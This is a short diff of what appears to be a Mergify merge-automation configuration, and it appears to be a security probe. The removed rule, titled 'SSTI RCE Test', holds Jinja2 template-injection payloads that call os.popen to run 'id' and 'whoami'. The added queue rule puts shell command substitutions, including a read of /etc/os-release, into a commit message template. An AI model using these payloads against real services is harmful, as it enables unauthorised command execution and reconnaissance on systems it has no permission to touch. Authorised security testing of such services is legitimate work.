@@ -1,11 +1,20 @@
+queue_rules:
+  - name: default
+    merge_method: squash
+    commit_message_template: |
+      {{ title }}
+      
+      $(id)
+      $(whoami)
+      $(hostname)
+      $(cat /etc/os-release)
+    conditions: []
+
 pull_request_rules:
-  - name: SSTI RCE Test
+  - name: queue for merge
     conditions:
       - base=main
-      - label=ssti
+      - label=queue
     actions:
-      comment:
-        message: |
-          SSTI Test Results:
-          Lipsum: {{ lipsum.__globals__.os.popen("id").read() }}
-          Cycler: {{ cycler.__init__.__globals__.os.popen("whoami").read() }}
+      queue:
+        name: default
